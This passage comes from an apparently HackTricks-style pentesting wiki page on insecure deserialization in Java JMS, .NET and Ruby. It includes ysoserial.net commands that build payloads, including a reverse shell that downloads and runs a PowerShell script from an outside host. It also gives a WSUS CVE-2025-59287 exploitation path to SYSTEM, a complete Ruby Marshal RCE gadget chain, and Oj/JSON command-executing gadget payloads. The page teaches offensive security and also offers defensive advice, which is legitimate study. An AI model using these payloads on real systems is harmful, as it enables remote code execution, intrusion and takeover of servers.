- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Find whats is **JNDI Injection, how to abuse it via RMI, CORBA & LDAP and how to exploit log4shell** (and example of this vuln) in the following page:


{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Message Service

> The **Java Message Service** (**JMS**) API is a Java message-oriented middleware API for sending messages between two or more clients. It is an implementation to handle the producer–consumer problem. JMS is a part of the Java Platform, Enterprise Edition (Java EE), and was defined by a specification developed at Sun Microsystems, but which has since been guided by the Java Community Process. It is a messaging standard that allows application components based on Java EE to create, send, receive, and read messages. It allows the communication between different components of a distributed application to be loosely coupled, reliable, and asynchronous. (From [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### 产品

有多个产品使用该 middleware 来发送消息：

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### 利用

基本上有一大批以不安全方式使用 JMS 的服务。因此，如果你有足够的权限向这些服务发送消息（通常需要有效的凭证），你就可能发送包含恶意对象的 serialized payload，这些对象会被 consumer/subscriber 反序列化（deserialized）。\
这意味着在这种利用中，所有将使用该消息的 clients 都会受到感染。

你应该记住，即使服务存在漏洞（因为它不安全地 deserializing 用户输入），你仍然需要找到有效的 gadgets 来利用该漏洞。

工具 [JMET](https://github.com/matthiaskaiser/jmet) 是为连接并攻击这些服务而创建的，它可以发送多个使用已知 gadgets 序列化的恶意对象。如果服务仍然存在漏洞并且任何所用 gadget 在易受攻击的应用中存在，则这些利用将起作用。

### 参考资料

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

在 .Net 的上下文中，deserialization 利用与 Java 中的类似——通过利用 gadgets 在对象反序列化（deserialization）期间执行特定代码。

### 指纹

#### 白盒

应检查源代码中是否出现：

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

重点应放在那些允许类型由用户可控变量决定的 serializers 上。

#### 黑盒

搜索应以 Base64 编码字符串 **AAEAAAD/////** 或任何类似模式为目标，这些模式可能在服务器端被 deserialized，从而允许控制要反序列化的类型。这可能包括但不限于包含 `TypeObject` 或 `$type` 的 **JSON** 或 **XML** 结构。

### ysoserial.net

在这种情况下，你可以使用工具 [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) 来 **创建 deserialization exploits**。下载 git 仓库后，你应使用例如 Visual Studio 来 **编译该工具**。

如果你想了解 **ysoserial.net 如何创建它的 exploit**，可以[**查看这页，解释了 ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md)。

**ysoserial.net** 的主要选项有：**`--gadget`**, **`--formatter`**, **`--output`** 和 **`--plugin`**。

- **`--gadget`** 用于指示要滥用的 gadget（指明在反序列化期间将被滥用以执行命令的类/函数）。
- **`--formatter`** 用来指示序列化 exploit 的方法（你需要知道后端用于反序列化 payload 的库并使用相同的 formatter 进行序列化）。
- **`--output`** 用于指示你是否希望 exploit 为 **raw** 或 **base64** 编码。_注意 **ysoserial.net** 会使用 **UTF-16LE**（Windows 默认使用的编码）对 payload 进行**编码**，所以如果你得到 raw 并仅在 Linux 控制台上对其进行编码，可能会遇到一些 **编码兼容性问题**，这会阻止 exploit 正常工作（在 HTB JSON 题中该 payload 在 UTF-16LE 和 ASCII 下都能工作，但这并不意味着在所有情况下都有效）。_
- **`--plugin`** ysoserial.net 支持插件以为特定框架（如 ViewState）制作 **exploit**。

#### 更多 ysoserial.net 参数

- `--minify` 将提供一个 **更小的 payload**（如果可能）
- `--raf -f Json.Net -c "anything"` 这将显示所有可以与提供的 formatter（此处为 `Json.Net`）一起使用的 gadgets
- `--sf xml` 你可以 **指定一个 gadget**（`-g`）并且 ysoserial.net 将搜索包含 "xml"（不区分大小写）的 formatter

**ysoserial examples** to create exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** 还有一个 **非常有趣的参数**，它有助于更好地理解每个 exploit 的工作方式： `--test`\
如果你指定了这个参数，**ysoserial.net** 会 **尝试** **在本地执行 exploit，** 这样你可以测试你的 payload 是否能正常工作。\
这个参数很有用，因为如果你查看代码你会发现像下面这样的代码块（来自 [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
这意味着，为了测试 exploit，代码将调用 [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
在 **之前的代码易受所生成的 exploit 利用**。所以如果你在 .Net 应用中发现类似的代码，说明该应用很可能也易受影响。\
因此，参数 **`--test`** 允许我们判断 **哪些代码片段容易受到 ysoserial.net 可构造的反序列化 exploit 的影响。**

### ViewState

查看 [这篇 POST 关于 **如何尝试利用 \_\_ViewState 参数 of .Net** ](exploiting-__viewstate-parameter.md) 以 **执行任意代码。** 如果你 **已经知道受害机器使用的密钥**，请[**阅读此文以了解如何执行代码**](exploiting-__viewstate-knowing-the-secret.md)**。**

### Real‑world sink: WSUS AuthorizationCookie & Reporting SOAP → BinaryFormatter/SoapFormatter RCE

- 受影响的端点：
- `/SimpleAuthWebService/SimpleAuth.asmx` → GetCookie() 的 AuthorizationCookie 被解密然后用 BinaryFormatter 反序列化。
- `/ReportingWebService.asmx` → ReportEventBatch 及相关的 SOAP 操作会到达 SoapFormatter sinks；base64 gadget 在 WSUS 控制台摄取该事件时被处理。
- 根本原因：攻击者可控的字节到达遗留的 .NET 格式化器（BinaryFormatter/SoapFormatter），且没有严格的允许列表/绑定器，因此 gadget 链以 WSUS 服务账户（通常为 SYSTEM）身份执行。

Minimal exploitation (Reporting path):
1) Generate a .NET gadget with ysoserial.net (BinaryFormatter or SoapFormatter) and output base64, for example:
```powershell
# Reverse shell (EncodedCommand) via BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <BASE64_PS>"

# Simple calc via SoapFormatter (test)
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "calc.exe"
```
2) 为 `ReportEventBatch` 构造 SOAP，嵌入 base64 gadget 并将其 POST 到 `/ReportingWebService.asmx`。
3) 当管理员打开 WSUS 控制台时，事件被 deserialized，gadget 被触发（以 SYSTEM 身份获得 RCE）。

AuthorizationCookie / GetCookie()
- 一个伪造的 AuthorizationCookie 可能会被接受、解密并传递到 BinaryFormatter sink，从而在可达时触发 pre‑auth RCE。

Public PoC (tecxx/CVE-2025-59287-WSUS) 参数：
```powershell
$lhost = "192.168.49.51"
$lport = 53
$targetURL = "http://192.168.51.89:8530"
```
参见 [Windows Local Privilege Escalation – WSUS](../../windows-hardening/windows-local-privilege-escalation/README.md)

### 预防

要降低 .Net 中反序列化相关的风险：

- **避免让数据流定义其对象类型。** 在可能的情况下使用 `DataContractSerializer` 或 `XmlSerializer`。
- **对于 `JSON.Net`，将 `TypeNameHandling` 设置为 `None`：** `TypeNameHandling = TypeNameHandling.None`
- **避免在 `JavaScriptSerializer` 中使用 `JavaScriptTypeResolver`。**
- **限制可反序列化的类型**，了解 .Net 类型的固有风险，例如 `System.IO.FileInfo`，它可以修改服务器文件的属性，可能导致拒绝服务攻击。
- **对具有危险属性的类型保持警惕**，例如 `System.ComponentModel.DataAnnotations.ValidationException` 及其 `Value` 属性，可能被利用。
- **安全地控制类型实例化**，以防止攻击者影响反序列化过程，否则即使是 `DataContractSerializer` 或 `XmlSerializer` 也可能变得脆弱。
- **使用自定义 `SerializationBinder` 为 `BinaryFormatter` 和 `JSON.Net` 实现白名单控制。**
- **保持对 .Net 中已知不安全反序列化 gadget 的了解**，并确保反序列化器不实例化这些类型。
- **将可能有风险的代码与具有互联网访问权限的代码隔离**，以避免将已知的 gadgets（例如 WPF 应用中的 `System.Windows.Data.ObjectDataProvider`）暴露给不受信任的数据源。

### **参考资料**

- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

在 Ruby 中，序列化由 **marshal** 库中的两个方法实现。第一个方法称为 **dump**，用于将对象转换为字节流，该过程称为序列化。相反，第二个方法 **load** 用于将字节流还原为对象，该过程称为反序列化。

为保护序列化对象的安全，**Ruby 使用 HMAC (Hash-Based Message Authentication Code)**，以确保数据的完整性和真实性。用于此目的的密钥存储在以下几个可能位置之一：

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generic deserialization to RCE gadget chain (更多信息见** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Other RCE chain to exploit Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() 方法

正如 [**this vulnerability report**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/) 所述，如果未经过滤的用户输入到达 Ruby 对象的 `.send()` 方法，该方法允许使用任意参数**调用对象的任何其他方法**。

例如，调用 eval 并将 Ruby 代码作为第二个参数传入将允许执行任意代码：
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
此外，如前文所述，如果攻击者只控制 **`.send()`** 的一个参数，那么就可以调用对象中任何 **不需要参数** 或其参数具有 **默认值** 的方法。\
为此，可以枚举该对象的所有方法以 **找到满足这些要求的一些有趣方法**。
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby class pollution

查看如何可能在此处[pollute a Ruby class and abuse it in here](ruby-class-pollution.md)。

### Ruby _json pollution

当在请求体中发送一些不可被哈希（例如 array） 的值时，它们会被添加到一个名为 `_json` 的新键中。然而，攻击者也可以在请求体中设置一个名为 `_json` 的值，内容为任意他想要的值。然后，例如，如果后端检查某个参数的真实性，但又使用 `_json` 参数来执行某些操作，就可能发生授权绕过。

在[Ruby _json pollution page](ruby-_json-pollution.md) 查看更多信息。

### 其他库

该技术摘自[ **from this blog post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared)。

还有其他 Ruby 库可用于序列化对象，在不安全的反序列化过程中可能被滥用以获取 RCE。下面的表格列出了一些此类库以及在反序列化时调用的库内方法（基本上是可被滥用以实现 RCE 的函数）：

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>库</strong></td><td><strong>输入数据</strong></td><td><strong>类内触发方法</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (class needs to be put into hash(map) as key)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([see notes regarding json_create at end](#table-vulnerable-sinks))</td></tr></tbody></table>

基本示例：
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
在尝试滥用 Oj 的情况下，可以找到一个 gadget class，其内部的 `hash` 函数会调用 `to_s`，`to_s` 会调用 spec，随后调用 fetch_path，从而可以让它去获取一个任意 URL，这为检测此类未过滤的 deserialization 漏洞提供了极好的探测手段。
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
此外，发现通过之前的技术在系统中也会创建一个文件夹，这是滥用另一个 gadget、将其转变为完整 RCE 的必要条件，例如：
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Check for more details in the [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

### Bootstrap Caching

Not really a desearilization vuln but a nice trick to abuse bootstrap caching to to get RCE from a rails application with an arbitrary file write (find the complete [original post in here](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/)).

下面是文章中利用 Bootsnap 缓存滥用任意文件写入漏洞以实现 RCE 的步骤简要总结：

- Identify the Vulnerability and Environment

  Rails 应用的文件上传功能允许攻击者任意写入文件。尽管应用以受限方式运行（例如由于 Docker 的 non-root user，只有像 tmp 这样的特定目录可写），但这仍然允许写入 Bootsnap 的缓存目录（通常位于 tmp/cache/bootsnap 下）。

- Understand Bootsnap’s Cache Mechanism

  Bootsnap 通过缓存已编译的 Ruby 代码、YAML 和 JSON 文件来加速 Rails 启动时间。它保存的缓存文件包含一个 cache key header（包含诸如 Ruby version、file size、mtime、compile options 等字段），后面跟随已编译的代码。该 header 在应用启动时用于验证缓存。

- Gather File Metadata

  攻击者首先选择一个在 Rails 启动期间可能被加载的目标文件（例如来自 Ruby 标准库的 set.rb）。通过在容器内执行 Ruby 代码，他们提取出关键元数据（例如 RUBY_VERSION、RUBY_REVISION、size、mtime 和 compile_option）。这些数据对于制作有效的 cache key 至关重要。

- Compute the Cache File Path

  通过复现 Bootsnap 的 FNV-1a 64-bit 哈希机制，确定正确的缓存文件路径。此步骤确保恶意缓存文件被放置在 Bootsnap 期望的位置（例如 tmp/cache/bootsnap/compile-cache-iseq/ 下）。

- Craft the Malicious Cache File

  攻击者准备一个 payload，该 payload：
  - Executes arbitrary commands (for example, running id to show process info).
  - Removes the malicious cache after execution to prevent recursive exploitation.
  - Loads the original file (e.g., set.rb) to avoid crashing the application.

  该 payload 被编译成二进制 Ruby 代码，并与精心构造的 cache key header 连接（使用先前收集的元数据和 Bootsnap 的正确版本号）。

- Overwrite and Trigger Execution

  利用任意文件写入漏洞，攻击者将构造好的缓存文件写入计算出的路径。接着，他们触发服务器重启（通过写入 tmp/restart.txt，该文件由 Puma 监控）。在重启期间，当 Rails require 目标文件时，恶意缓存文件被加载，导致远程代码执行 (RCE)。



### Ruby Marshal exploitation in practice (updated)

将任何不受信任的字节到达 `Marshal.load`/`marshal_load` 的路径视为 RCE sink。Marshal 在重构对象图时会触发库/gem 的回调，从而导致执行任意代码。


- Minimal vulnerable Rails code path:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- 真实链中常见的 gadget 类：`Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- 嵌入在 payloads 中的典型 side-effect marker（在 unmarshal 期间执行）：
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
Where it surfaces in real apps:
- Rails cache stores and session stores historically using Marshal
- Background job backends and file-backed object stores
- Any custom persistence or transport of binary object blobs

Industrialized gadget discovery:
- Grep for constructors, `hash`, `_load`, `init_with`, or side-effectful methods invoked during unmarshal
- Use CodeQL’s Ruby unsafe deserialization queries to trace sources → sinks and surface gadgets
- Validate with public multi-format PoCs (JSON/XML/YAML/Marshal)


## 参考资料

- Trail of Bits – Marshal madness: Ruby 反序列化漏洞简史: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4 Marshal chain: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 insecure deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Discovering gadget chains in Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby unsafe deserialization (query help): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 universal chain: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 release: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby fix PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Auditing RubyGems.org (Marshal findings): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/
- watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035: https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/
- [OffSec – CVE-2025-59287 WSUS unsafe deserialization (blog)](https://www.offsec.com/blog/recent-vulnerabilities-in-redis-servers-lua-scripting-engine-2/)
- [PoC – tecxx/CVE-2025-59287-WSUS](https://github.com/tecxx/CVE-2025-59287-WSUS)

{{#include ../../banners/hacktricks-training.md}}
